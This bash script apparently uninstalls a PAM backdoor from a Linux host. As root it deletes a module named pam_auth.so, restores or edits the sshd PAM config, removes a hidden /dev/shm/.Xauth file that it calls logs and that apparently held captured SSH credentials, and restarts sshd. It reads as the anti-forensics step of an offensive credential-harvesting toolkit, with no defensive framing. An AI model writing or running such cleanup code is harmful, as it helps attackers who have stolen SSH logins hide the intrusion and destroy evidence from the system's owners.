#!/bin/bash
#
# Clean removal
#

set -e

RED='\033[0;31m'
GREEN='\033[0;32m'
NC='\033[0m'

[ "$(id -u)" -ne 0 ] && echo -e "${RED}[!] Need root${NC}" && exit 1

echo -e "${GREEN}[*] Removing PAM module...${NC}"
PAM_DIR=$(dirname $(find /lib* /usr/lib* -name "pam_unix.so" 2>/dev/null | head -1) 2>/dev/null)
rm -f "${PAM_DIR}/pam_auth.so" 2>/dev/null

echo -e "${GREEN}[*] Restoring PAM config...${NC}"
PAM_SSHD="/etc/pam.d/sshd"

if [ -f "${PAM_SSHD}.bak" ]; then
    mv "${PAM_SSHD}.bak" "$PAM_SSHD"
else
    sed -i '/pam_auth.so/d' "$PAM_SSHD"
fi

echo -e "${GREEN}[*] Cleaning logs...${NC}"
rm -f /dev/shm/.Xauth 2>/dev/null

echo -e "${GREEN}[*] Restarting SSH...${NC}"
systemctl restart sshd 2>/dev/null || service sshd restart 2>/dev/null || true

echo -e "${GREEN}[+] Cleanup complete${NC}"
